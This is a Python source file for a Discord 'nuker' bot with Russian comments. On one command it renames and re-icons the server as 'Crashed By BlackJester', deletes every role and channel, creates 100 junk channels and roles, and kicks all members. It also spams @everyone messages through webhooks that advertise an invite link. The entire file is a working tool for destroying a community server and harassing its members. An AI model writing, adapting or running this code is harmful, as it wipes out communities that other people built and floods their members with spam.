import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread
import requests



intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='+',intents=intents)

bot.remove_command("help")

@bot.command()
async def go(ctx):
        guild = ctx.message.guild     
        with open('hacked.jpg', 'rb') as f:
            icon = f.read()
        await guild.edit(name="Crashed By BlackJester", icon=icon)

        await ctx.message.delete()

        for m in ctx.guild.roles:
            try:
                await m.delete(reason="Ваш сервер ломается")
            except:
                pass

        for channel in ctx.guild.channels:  # собираем
                try:
                        await channel.delete(reason="Ваш сервер ломается")  # удаляем
                except:
                        pass


        for _ in range(100):
            await guild.create_text_channel('crash-by-blackjester')

        for _ in range(100):
          await guild.create_role(name='crash-by-blackjester')

        for m in ctx.guild.members:
          try:
           await m.kick(reason="Ваш сервер крашится")
          except:
           pass
        


@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name = "Crashed By BlackJester")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      for i in range(50):
        try:
          await webhook.send("@everyone @here Данный сервер крашится и ломается прямо сейчас на ваших глазах!!! Переезжаем на новый сервер!! >:( : https://discord.gg/HDstzVceAm", tts=False)
        except:
          pass       


        
token = 'тут токен'
bot.run(token)
